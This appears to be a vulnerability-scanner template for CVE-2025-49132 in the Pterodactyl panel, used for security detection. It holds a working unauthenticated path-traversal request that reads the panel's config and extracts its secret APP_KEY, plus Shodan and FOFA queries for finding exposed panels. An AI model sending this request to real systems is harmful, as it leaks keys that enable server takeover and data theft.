http:
- extractors:
  - json:
    - .[] | .app.key
    name: APP_KEY
    type: json
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - '{"app":{"version":'
    - '"key":"base64{{'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/locales/locale.json?locale=..%2F..%2Fconfig&namespace=app'
id: CVE-2025-49132
info:
  author: darses
  classification:
    cve-id: CVE-2025-49132
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-20
    epss-percentile: 0.96305
    epss-score: 0.28127
  description: 'Pterodactyl is a free, open-source game server management panel. Using
    the /locales/locale.json with the locale and namespace query parameters, a malicious
    actor is able to execute arbitrary code without being authenticated.

    '
  impact: 'With the ability to execute arbitrary code, this vulnerability can be exploited
    in an infinite number of ways. It could be used to gain access to the Panel''s
    server, read credentials from the Panel''s config (.env or otherwise), extract
    sensitive information from the database (such as user details [username, email,
    first and last name, hashed password, ip addresses, etc]), access files of servers
    managed by the panel, etc.

    '
  metadata:
    fofa-query:
    - title="Pterodactyl"
    - icon_hash="-456405319"
    - icon_hash="846001371"
    - 'Set-Cookie: pterodactyl_session='
    product: panel
    shodan-query:
    - title:"Pterodactyl"
    - http.favicon.hash:-456405319
    - http.favicon.hash:846001371
    - 'Set-Cookie: pterodactyl_session='
    vendor: pterodactyl
    verified: true
  name: Pterodactyl Panel - Remote Code Execution
  reference:
  - https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843
  - https://github.com/pterodactyl/panel/commit/24c82b0e335fb5d7a844226b08abf9f176e592f0
  - https://github.com/pterodactyl/panel/releases/tag/v1.11.11
  remediation: 'Upgrade to Pterodactyl version 1.11.11+. There are no software workarounds
    for this vulnerability, but use of an external Web Application Firewall (WAF)
    could help mitigate this attack.

    '
  severity: critical
  tags: pterodactyl, cve, cve2025, rce, lfi,vkev,vuln
